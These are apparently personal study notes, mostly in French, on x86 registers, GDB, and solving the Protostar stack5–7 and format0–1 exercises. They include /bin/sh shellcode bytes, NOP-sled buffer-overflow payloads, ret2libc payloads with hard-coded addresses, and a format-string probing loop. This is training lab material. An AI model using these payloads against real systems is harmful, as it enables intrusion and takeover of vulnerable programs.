# Note ASM86

* [EIP](http://www.c-jump.com/CIS77/ASM/Instructions/I77_0040_instruction_pointer.htm): Instruction Pointer Register 
* [ESP](http://www.c-jump.com/CIS77/ASM/Stack/S77_0040_esp_register.htm): The ESP register serves as an indirect memory operand pointing to the top of the stack at any time.
* EBP: ebp is/was for a stack frame so that when you entered a function ebp could get a copy of esp at that point, everything on the stack before that happens, return address, passed in parameters, etc and things that are global for that function (local variables) will now be a static distance away from the stack frame pointer for the duration of the function. esp is now free to wander about as the compiler desires and can be used when nesting to other functions (each needs to preserve the ebp naturally). 
* [EAX](https://fr.wikibooks.org/wiki/Programmation_Assembleur/x86/Registres): Utilisé pour les opérations arithmétiques et le stockage de la valeur de retour des appels systèmes.

# Memo GDB

Commands:

* [https://cs.brown.edu/courses/cs033/docs/guides/gdb.pdf](https://cs.brown.edu/courses/cs033/docs/guides/gdb.pdf)

Outils:

* [Peda](https://github.com/longld/peda)



Lancer `gdb`:

	gdb <program>

Set a breakpoint at the start of `main`:

	b[reak] main

Set a breakpoint to a given address:

	b[reak] *0x123456789

Remove a breakpoint:

	d[elete] <breakpoint number>

Run the program:

	r[un] [arg1 [arg2] ...]

Set the display:

	display/3i $eip

Unset the display:

	undisplay/3i $eip

Step into (next instruction): 

	si

> Execute one machine instruction, then stop and return to the debugger. 

Skip a function call:

	ni

> Execute one machine instruction, but if it is a function call, proceed until the function returns. 

Get out of a function:

	fin[ish]

Print a value:

	print main

# Stack5

## Présentation

[https://web.archive.org/web/20170419023355/https://exploit-exercises.com/protostar/stack5/](https://web.archive.org/web/20170419023355/https://exploit-exercises.com/protostar/stack5/)

	0x080483c4 <main+0>:	push   ebp
	0x080483c5 <main+1>:	mov    ebp,esp
	0x080483c7 <main+3>:	and    esp,0xfffffff0
	0x080483ca <main+6>:	sub    esp,0x50
	0x080483cd <main+9>:	lea    eax,[esp+0x10]
	0x080483d1 <main+13>:	mov    DWORD PTR [esp],eax
	0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
	0x080483d9 <main+21>:	leave  
	0x080483da <main+22>:	ret  

## Représentation

![](stack1.png)

![](stack2.png)

![](stack3.png)

![](stack4.png)

![](stack5.png)

![](stack6.png)

> Veuillez noter que `0x40 = 64` et `char buffer[64]`. On réserve 64 octets.

## Exploitation

Sur [ce site](http://shell-storm.org/shellcode/files/shellcode-827.php)
, on trouve un exploit:

	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

Il faut:
* injecter le code de l'exploit dans le processus.
* modifier la case mémoire qui contient l'adresse de retour de la fonction `main()`. Il faut y injecter l'adresse du code qui contient l'exploit.

La case mémoire qui contient l'adresse de retour de la fonction `main()` se situe à `x + 0x44` octets de la variable `buffer`.

Pour injecter le code de l'exploit dans le processus, nous passons par l'intermédiaire d'une variable d'environnement.

Pour créer la variable d'environnement:

	python -c 'print "\x90" * (0x44+x) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > file
	ls -l file
	export MA_VARIABLE=$(cat file)

Avec `x` = 4, 8 ou 12.

Si `x=4`:

	python -c 'print "\x90" * (0x44 + 0x4) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > file

> * Il faut relancer le programme après création/modification de la variable d'environnement.
> * "\x90" est le code de l'instruction `NOP`.

Pour connaître l'adresse du code qui contient l'exploit:

	x/1000s $esp

> **Attention !!!** cette commande va affiche l'addresse de début de la chaîne "`MA_VARIABLE=...`".
> Il faut ajouter `strlen("MA_VARIABLE=")` à l'adresse afficher pour obtenir l'adresse de début du code à exécuter.


# Stack6

## Présentation

[https://web.archive.org/web/20140405142902/http://www.exploit-exercises.com/protostar/stack6](https://web.archive.org/web/20140405142902/http://www.exploit-exercises.com/protostar/stack6)

	(gdb) disassemble main
	Dump of assembler code for function main:
	0x080484fa <main+0>:	push   ebp
	0x080484fb <main+1>:	mov    ebp,esp
	0x080484fd <main+3>:	and    esp,0xfffffff0
	0x08048500 <main+6>:	call   0x8048484 <getpath>
	0x08048505 <main+11>:	mov    esp,ebp
	0x08048507 <main+13>:	pop    ebp
	0x08048508 <main+14>:	ret    
	End of assembler dump.


	(gdb) disassemble getpath
	Dump of assembler code for function getpath:
	0x08048484 <getpath+0>:	push   ebp
	0x08048485 <getpath+1>:	mov    ebp,esp
	0x08048487 <getpath+3>:	sub    esp,0x68
	0x0804848a <getpath+6>:	mov    eax,0x80485d0
	0x0804848f <getpath+11>:	mov    DWORD PTR [esp],eax
	0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>
	0x08048497 <getpath+19>:	mov    eax,ds:0x8049720
	0x0804849c <getpath+24>:	mov    DWORD PTR [esp],eax
	0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>
	0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
	0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
	0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
	0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
	0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
	0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
	0x080484b8 <getpath+52>:	and    eax,0xbf000000
	0x080484bd <getpath+57>:	cmp    eax,0xbf000000
	0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>
	0x080484c4 <getpath+64>:	mov    eax,0x80485e4
	0x080484c9 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
	0x080484cc <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
	0x080484d0 <getpath+76>:	mov    DWORD PTR [esp],eax
	0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>
	0x080484d8 <getpath+84>:	mov    DWORD PTR [esp],0x1
	0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>
	0x080484e4 <getpath+96>:	mov    eax,0x80485f0
	0x080484e9 <getpath+101>:	lea    edx,[ebp-0x4c]
	0x080484ec <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
	0x080484f0 <getpath+108>:	mov    DWORD PTR [esp],eax
	0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
	0x080484f8 <getpath+116>:	leave  
	0x080484f9 <getpath+117>:	ret    
	End of assembler dump.

Objectif: exécuter `system("/bin/sh")`.

## Exploitation

* On place `"/bin/sh`" dans une variable d'environnement. On récupère l'adresse de la chaîne de caractères.
* On remplace l'adresse de retour de `getpath()` par l'adresse de `system()`.
* On place dans la pile l'adresse de la chaîne `"/bin/sh`" de façon à ce que `system()` l'utilise.

### Technique 1

Obtenir l'adresse de `system()`:

	b main
	r
	print system

Résultat:

	(gdb) print system
	$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>

Il faut ajouter des "` `" (espaces) avant la chaîne de caractères.

	export MA_VARIABLE_ENV=$(python -c 'print " " * 0x1000 + "/bin/sh"')
	echo "$MA_VARIABLE_ENV"

Puis:

	(gdb) x/1000s $esp

	0xbfffe955:	 "/opt/protostar/bin/stack6"
	0xbfffe96f:	 "MA_VARIABLE_ENV=", ' ' <repeats 184 times>...
	0xbfffea37:	 ' ' <repeats 200 times>...
	0xbfffeaff:	 ' ' <repeats 200 times>...
	0xbfffebc7:	 ' ' <repeats 200 times>...
	0xbfffec8f:	 ' ' <repeats 200 times>...
	0xbfffed57:	 ' ' <repeats 200 times>...
	0xbfffee1f:	 ' ' <repeats 200 times>...
	0xbfffeee7:	 ' ' <repeats 200 times>...
	0xbfffefaf:	 ' ' <repeats 200 times>...
	0xbffff077:	 ' ' <repeats 200 times>...
	0xbffff13f:	 ' ' <repeats 200 times>...
	0xbffff207:	 ' ' <repeats 200 times>...
	0xbffff2cf:	 ' ' <repeats 200 times>...
	0xbffff397:	 ' ' <repeats 200 times>...
	0xbffff45f:	 ' ' <repeats 200 times>...
	0xbffff527:	 ' ' <repeats 200 times>...
	0xbffff5ef:	 ' ' <repeats 200 times>...
	0xbffff6b7:	 ' ' <repeats 200 times>...
	0xbffff77f:	 ' ' <repeats 200 times>...
	0xbffff847:	 ' ' <repeats 200 times>...
	0xbffff90f:	 ' ' <repeats 112 times>, "/bin/sh"

Donc l'adresse de la chaîne `"/bin/sh`" est `0xbffff96f + 16`.

	(gdb) print/x 0xbffff96f + 2048
	$3 = 0xbffff97f

> * il faut lancer l'exécution de la function `main` avant.
> * `0x1000 = 4096`. On "tape" au milieu de la chaîne (à 2048).

Calcul de la distance entre `buffer` et l'adresse de retour de la fonction `getpath()`:

	0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
	0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
	0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>

Donc, entre `buffer` et l'adresse de retour de la fonction `getpath()`, il y a `0x4c + 0x04 = 0x50`, soit (80 octets).

Remplacement de l'adresse de retour de `getpath()` par l'adresse de `system()` (`0xb7ecffb0`):

	python -c 'print "A" * 80 + "\xB0\xFF\xEC\xB7" + "BBBB" + "\x7F\xF9\xFF\xBF"' > /tmp/file && ls -l /tmp/file
	stack6 < /tmp/file

> "BBBB": adresse de retour de `system`.

On lance l'exécution du programme:

	(cat /tmp/file; cat) | ./stack6 

### Technique 2

Dans `gdb`, pour trouver l'adresse de chargement de la librairie:

	info proc map

Télécharger [rt](https://github.com/0vercl0k/rp/downloads).

	(gdb) info proc map
	process 2764
	cmdline = '/opt/protostar/bin/stack6'
	cwd = '/opt/protostar/bin'
	exe = '/opt/protostar/bin/stack6'
	Mapped address spaces:

		Start Addr   End Addr       Size     Offset objfile
		 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
		 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
		0xb7e96000 0xb7e97000     0x1000          0        
		0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
		0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
		0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
		0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
		0xb7fd9000 0xb7fdc000     0x3000          0        
		0xb7fe0000 0xb7fe2000     0x2000          0        
		0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
		0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
		0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
		0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
		0xbffea000 0xc0000000    0x16000          0           [stack]

Du coup:

	user@protostar:/opt/protostar/bin$ ./rp-lin-x86 --search-hexa="/bin/sh" --file /lib/libc-2.11.2.so
	Trying to open '/lib/libc-2.11.2.so'..
	Loading ELF information..
	FileFormat: Elf, Arch: Ia32
	0x0011f3bf: /bin/sh

Donc, on connaît l'adresse de la chaîne "`/bin/sh`" relativement au debut de la `libc`: `0x0011f3bf`.
Il faut ajouter l'adresse de chargement de la librairie.

	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so

Donc:

	(gdb) print/x 0x0011f3bf + 0xb7e97000
	$1 = 0xb7fb63bf

D'où:

	user@protostar:/opt/protostar/bin$ (cat /tmp/file; cat) | ./stack6
	input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA���BBBB�c��
	ls /
	bin   dev  home        lib   lost+found  mnt  proc  selinux  sys  usr  vmlinuz
	boot  etc  initrd.img  live  media	 opt  sbin  srv      tmp  var


# Stack7

## Présentation

[](https://web.archive.org/web/20140405141221/http://exploit-exercises.com/protostar/stack7)

## Exploitation

	(gdb) disassemble main
	Dump of assembler code for function main:
	0x08048545 <main+0>:	push   ebp
	0x08048546 <main+1>:	mov    ebp,esp
	0x08048548 <main+3>:	and    esp,0xfffffff0
	0x0804854b <main+6>:	call   0x80484c4 <getpath>
	0x08048550 <main+11>:	mov    esp,ebp
	0x08048552 <main+13>:	pop    ebp
	0x08048553 <main+14>:	ret    
	End of assembler dump.
	(gdb) disassemble getpath
	Dump of assembler code for function getpath:
	0x080484c4 <getpath+0>:	push   ebp
	0x080484c5 <getpath+1>:	mov    ebp,esp
	0x080484c7 <getpath+3>:	sub    esp,0x68
	0x080484ca <getpath+6>:	mov    eax,0x8048620
	0x080484cf <getpath+11>:	mov    DWORD PTR [esp],eax
	0x080484d2 <getpath+14>:	call   0x80483e4 <printf@plt>
	0x080484d7 <getpath+19>:	mov    eax,ds:0x8049780
	0x080484dc <getpath+24>:	mov    DWORD PTR [esp],eax
	0x080484df <getpath+27>:	call   0x80483d4 <fflush@plt>
	0x080484e4 <getpath+32>:	lea    eax,[ebp-0x4c]
	0x080484e7 <getpath+35>:	mov    DWORD PTR [esp],eax
	0x080484ea <getpath+38>:	call   0x80483a4 <gets@plt>
	0x080484ef <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
	0x080484f2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
	0x080484f5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
	0x080484f8 <getpath+52>:	and    eax,0xb0000000
	0x080484fd <getpath+57>:	cmp    eax,0xb0000000
	0x08048502 <getpath+62>:	jne    0x8048524 <getpath+96>
	0x08048504 <getpath+64>:	mov    eax,0x8048634
	0x08048509 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
	0x0804850c <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
	0x08048510 <getpath+76>:	mov    DWORD PTR [esp],eax
	0x08048513 <getpath+79>:	call   0x80483e4 <printf@plt>
	0x08048518 <getpath+84>:	mov    DWORD PTR [esp],0x1
	0x0804851f <getpath+91>:	call   0x80483c4 <_exit@plt>
	0x08048524 <getpath+96>:	mov    eax,0x8048640
	0x08048529 <getpath+101>:	lea    edx,[ebp-0x4c]
	0x0804852c <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
	0x08048530 <getpath+108>:	mov    DWORD PTR [esp],eax
	0x08048533 <getpath+111>:	call   0x80483e4 <printf@plt>
	0x08048538 <getpath+116>:	lea    eax,[ebp-0x4c]
	0x0804853b <getpath+119>:	mov    DWORD PTR [esp],eax
	0x0804853e <getpath+122>:	call   0x80483f4 <strdup@plt>
	0x08048543 <getpath+127>:	leave  
	0x08048544 <getpath+128>:	ret    
	End of assembler dump.

Il faut utiliser `rp-lin-x86`. Par exemple:

	user@protostar:/opt/protostar/bin$ ./rp-lin-x86 --search-hexa="/bin/sh" --file /lib/libc-2.11.2.so
	Trying to open '/lib/libc-2.11.2.so'..
	Loading ELF information..
	FileFormat: Elf, Arch: Ia32
	0x0011f3bf: /bin/sh

Le commande `strdup(buffer)` retourne une valeur **stockée dans [EAX](https://fr.wikibooks.org/wiki/Programmation_Assembleur/x86/Registres)**.
Conséquence: nous avons un moyen d'injecter du code arbitraire dans le processus.

On place un breakpoint à la fin de la fonction `getpath()`:

	b *0x08048544
	r

On trouve l'adresse de retour de `getpath()`.

On cherche un `call eax` dans le programme `stack7`:

	user@protostar:/opt/protostar/bin$ ./rp-lin-x86 --file stack7 -r 2 | egrep ':[^,]+call'
	0x08048478: call dword [0x0804965C+eax*4] ;  (1 found)
	0x080485b4: call dword [ebx+esi*4-0x000000E8] ;  (1 found)
	0x080484bf: call eax ;  (1 found)
	0x080485eb: call eax ;  (1 found)

Donc, nous avons:

* l'adresse d'une instruction `call eax` (ex: `0x080485eb`).
* un moyen d'injecter une adresse dans EAX via `strdup()` (retour de la fonction stockée dans `EAX`).

Nombre d'octets pour écraser l'adresse de retour: 0x50.

Sur [ce site](http://shell-storm.org/shellcode/files/shellcode-811.php)
, on trouve un exploit:

	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

On forge une suite d'octets arbitaire:

	python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (0x50 - 28) + "\xBF\x84\x04\x08"' > /tmp/file && ls -l /tmp/file

> * `(0x50 - 28)` car il faut injecter 0x50 carcatères. Et le code du [shell](http://shell-storm.org/shellcode/files/shellcode-811.php) fait 28 octets.
> * On fait une pierre deux coups. L'appel à `call EAX` est injecté via écrasement causé par un débordement de buffer `buffer` (`0x50` caractères).

# Format0

## Présentation

[https://web.archive.org/web/20140405141145/http://exploit-exercises.com/protostar/format0](https://web.archive.org/web/20140405141145/http://exploit-exercises.com/protostar/format0)

## Exploitation

	(gdb) disassemble vuln
	Dump of assembler code for function vuln:
	0x080483f4 <vuln+0>:	push   ebp
	0x080483f5 <vuln+1>:	mov    ebp,esp
	0x080483f7 <vuln+3>:	sub    esp,0x68
	0x080483fa <vuln+6>:	mov    DWORD PTR [ebp-0xc],0x0
	0x08048401 <vuln+13>:	mov    eax,DWORD PTR [ebp+0x8]
	0x08048404 <vuln+16>:	mov    DWORD PTR [esp+0x4],eax
	0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]
	0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax
	0x0804840e <vuln+26>:	call   0x8048300 <sprintf@plt>
	0x08048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
	0x08048416 <vuln+34>:	cmp    eax,0xdeadbeef
	0x0804841b <vuln+39>:	jne    0x8048429 <vuln+53>
	0x0804841d <vuln+41>:	mov    DWORD PTR [esp],0x8048510
	0x08048424 <vuln+48>:	call   0x8048330 <puts@plt>
	0x08048429 <vuln+53>:	leave  
	0x0804842a <vuln+54>:	ret    
	End of assembler dump.
	(gdb) disassemble main
	Dump of assembler code for function main:
	0x0804842b <main+0>:	push   ebp
	0x0804842c <main+1>:	mov    ebp,esp
	0x0804842e <main+3>:	and    esp,0xfffffff0
	0x08048431 <main+6>:	sub    esp,0x10
	0x08048434 <main+9>:	mov    eax,DWORD PTR [ebp+0xc]
	0x08048437 <main+12>:	add    eax,0x4
	0x0804843a <main+15>:	mov    eax,DWORD PTR [eax]
	0x0804843c <main+17>:	mov    DWORD PTR [esp],eax
	0x0804843f <main+20>:	call   0x80483f4 <vuln>
	0x08048444 <main+25>:	leave  
	0x08048445 <main+26>:	ret    
	End of assembler dump.

Détermination de l'adresse relative de `buffer`:

	0x080483f4 <vuln+0>:	push   ebp
	0x080483f5 <vuln+1>:	mov    ebp,esp
	0x080483f7 <vuln+3>:	sub    esp,0x68
	0x080483fa <vuln+6>:	mov    DWORD PTR [ebp-0xc],0x0
	0x08048401 <vuln+13>:	mov    eax,DWORD PTR [ebp+0x8]
	0x08048404 <vuln+16>:	mov    DWORD PTR [esp+0x4],eax
	0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]
	0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax
	0x0804840e <vuln+26>:	call   0x8048300 <sprintf@plt>

Réponse:

	python -c 'print "0x64" + "\x0d\xad\xbe\xef"'

# format1

## Présentation

[](https://web.archive.org/web/20140405143000/http://exploit-exercises.com/protostar/format1)

## Exploitation

Si:

	int i;
	printf("toto%n", &i);
	// i vaut 4

	printf("toto%2$n", &i, &j);
	// j vaut 4

Pile:

	@retour de printf
	format string
	1er arg de la format string
	2em arg de la format string
	...

Code:

	(gdb) disassemble vuln
	Dump of assembler code for function vuln:
	0x080483f4 <vuln+0>:	push   ebp
	0x080483f5 <vuln+1>:	mov    ebp,esp
	0x080483f7 <vuln+3>:	sub    esp,0x18
	0x080483fa <vuln+6>:	mov    eax,DWORD PTR [ebp+0x8]
	0x080483fd <vuln+9>:	mov    DWORD PTR [esp],eax
	0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
	0x08048405 <vuln+17>:	mov    eax,ds:0x8049638
	0x0804840a <vuln+22>:	test   eax,eax
	0x0804840c <vuln+24>:	je     0x804841a <vuln+38>
	0x0804840e <vuln+26>:	mov    DWORD PTR [esp],0x8048500
	0x08048415 <vuln+33>:	call   0x8048330 <puts@plt>
	0x0804841a <vuln+38>:	leave  
	0x0804841b <vuln+39>:	ret    
	End of assembler dump.

Adresse de `string`:

	0x080483fa <vuln+6>:	mov    eax,DWORD PTR [ebp+0x8]
	0x080483fd <vuln+9>:	mov    DWORD PTR [esp],eax
	0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>

=> `ebp + 0x8`

Adresse de `target`:

	(gdb) print &target
	$2 = (int *) 0x8049638

> Il faut lancer le programme (`r`) avant.

Pour trouver:

	for i in `seq 500` ;
	do
	   ./format1 TOTO%$i\$08x`python -c "print '\x38\x96\x04\x08A'*4"` ;
	   echo ' <-> ' $i ; 
	done | grep 8049638





# Good links

* [https://louisrli.github.io/blog/2012/08/29/protostar-format0/#.YFC_DSXjKV4](https://louisrli.github.io/blog/2012/08/29/protostar-format0/#.YFC_DSXjKV4)
* [https://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/10-Format2.md](https://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/10-Format2.md)

